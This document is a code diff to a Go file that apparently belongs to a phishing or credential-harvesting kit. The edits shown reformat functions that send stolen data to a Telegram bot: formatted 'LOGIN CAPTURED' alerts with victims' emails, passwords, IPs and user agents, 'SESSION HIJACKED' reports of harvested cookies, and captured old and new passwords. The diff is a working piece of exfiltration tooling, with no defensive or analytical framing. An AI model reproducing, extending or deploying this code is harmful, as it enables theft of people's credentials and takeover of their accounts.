@@ -14,9 +14,7 @@ type TelegramConfig struct {
 	ChatID   string
 }
 
-// SendTelegramMessage sends a formatted message to Telegram asynchronously
 func SendTelegramMessage(cfg TelegramConfig, message string) {
-	// FIX: Prevent useless API calls if credentials are missing (like on Render if you forget to set them)
 	if cfg.BotToken == "" || cfg.ChatID == "" {
 		return
 	}
@@ -38,6 +36,7 @@ func SendTelegramMessage(cfg TelegramConfig, message string) {
 		if err != nil {
 			return
 		}
+
 		req.Header.Set("Content-Type", "application/json")
 
 		client := &http.Client{Timeout: 10 * time.Second}
@@ -47,19 +46,12 @@ func SendTelegramMessage(cfg TelegramConfig, message string) {
 		}
 		defer resp.Body.Close()
 
-		io.ReadAll(resp.Body) // Drain body to prevent connection leaks
+		io.ReadAll(resp.Body)
 	}()
 }
 
 func FormatLoginAlert(email, password, ip, userAgent string) string {
-	return fmt.Sprintf(`
-🔑 <b>LOGIN CAPTURED</b>
-📧 Email: <code>%s</code>
-🔒 Password: <code>%s</code>
-🌐 IP: <code>%s</code>
-🖥️ User-Agent: <code>%s</code>
-⏰ Time: %s
-`, email, password, ip, userAgent, time.Now().Format("15:04:05"))
+	return fmt.Sprintf("🔑 <b>LOGIN CAPTURED</b>\n📧 Email: <code>%s</code>\n🔒 Password: <code>%s</code>\n🌐 IP: <code>%s</code>\n🖥️ User-Agent: <code>%s</code>\n⏰ Time: %s\n", email, password, ip, userAgent, time.Now().Format("15:04:05"))
 }
 
 func FormatCookieHarvest(email string, cookies []string) string {
@@ -67,20 +59,9 @@ func FormatCookieHarvest(email string, cookies []string) string {
 	for _, c := range cookies {
 		cookieStr += c + "\n"
 	}
-	return fmt.Sprintf(`
-🍪 <b>SESSION HIJACKED</b>
-📧 Target: <code>%s</code>
-🔗 Cookies:
-<code>%s</code>
-`, email, cookieStr)
+	return fmt.Sprintf("🍪 <b>SESSION HIJACKED</b>\n📧 Target: <code>%s</code>\n🔗 Cookies:\n<code>%s</code>\n", email, cookieStr)
 }
 
 func FormatPasswordChange(oldPass, newPass, email string) string {
-	return fmt.Sprintf(`
-🔄 <b>PASSWORD CHANGED</b>
-📧 User: <code>%s</code>
-🔓 Old Pass: <code>%s</code>
-🔑 New Pass: <code>%s</code>
-⏰ Time: %s
-`, email, oldPass, newPass, time.Now().Format("15:04:05"))
+	return fmt.Sprintf("🔄 <b>PASSWORD CHANGED</b>\n📧 User: <code>%s</code>\n🔓 Old Pass: <code>%s</code>\n🔑 New Pass: <code>%s</code>\n⏰ Time: %s\n", email, oldPass, newPass, time.Now().Format("15:04:05"))
 }
